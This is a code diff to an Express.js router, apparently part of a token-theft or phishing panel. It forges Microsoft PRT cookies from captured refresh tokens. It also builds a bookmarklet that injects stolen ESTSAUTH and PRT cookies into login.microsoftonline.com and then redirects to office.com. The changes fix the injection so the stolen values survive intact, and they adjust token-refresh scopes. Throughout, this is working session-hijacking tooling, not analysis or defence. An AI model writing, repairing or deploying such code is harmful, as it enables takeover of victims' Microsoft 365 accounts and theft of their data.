@@ -326,10 +326,10 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
           console.warn('[Tokens] uid not found - PRT JWT generation will use base64 fallback');
         }
         const prtCookieObj = cookieConverter.generateXmsRefreshTokenCredential(
-          refreshToken,
-          accountType,
-          { tid: tid, uid: uid, scopes: 'openid profile email offline_access https://graph.microsoft.com/.default' }
-        );
+        refreshToken,
+        accountType,
+        { tid: tid, uid: uid, scopes: 'openid profile email offline_access' }
+      );
         if (prtCookieObj && prtCookieObj.value) {
           // IMPORTANT: Do NOT include domain attribute - browsers block third-party cookies
           // Set cookie for current page only, then redirect to auth endpoint
@@ -895,11 +895,13 @@ function generateInjectorScript(cookies, clientId, tenant) {
   var cookieJson = JSON.stringify(cookies);
 
   // Build bookmarklet code using document.cookie method
+  // NOTE: Do NOT use encodeURIComponent on cookie values - it corrupts PRT/ESTSAUTH values
+  // Microsoft cookies contain base64url chars (=, /, +) that must be preserved as-is
 var bookmarklet = 'javascript:(function(){' + 
   'var cookies=' + cookieJson + ';' + 
   'cookies.forEach(function(c){' + 
   'var domain=c.domain||".login.microsoftonline.com";' + 
-  'document.cookie=c.name+"="+encodeURIComponent(c.value)+"; domain="+domain+"; path=/; Secure; SameSite=None";' + 
+  'document.cookie=c.name+"="+c.value+"; domain="+domain+"; path=/; Secure; SameSite=None";' + 
   '});' + 
   'setTimeout(function(){' + 
    'window.location.href="https://www.office.com/";' + 
@@ -1180,7 +1182,7 @@ router.get('/prt-inject', userAuth, async (req, res) => {
     const prtCookieObj = cookieConverter.generateXmsRefreshTokenCredential(
       refreshToken,
       token.account_type || 'work_school',
-      { tid: tid, uid: uid, scopes: 'openid profile email offline_access https://graph.microsoft.com/.default' }
+            { tid: tid, uid: uid, scopes: 'openid profile email offline_access' }
     );
 
     if (!prtCookieObj || !prtCookieObj.value) {
@@ -1602,7 +1604,7 @@ router.post('/check-status', userAuth, async (req, res) => {
           client_id: clientId,
           grant_type: 'refresh_token',
           refresh_token: refreshToken,
-          scope: 'openid profile offline_access https://graph.microsoft.com/.default'
+                    scope: 'openid profile email offline_access'
         }),
         {
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
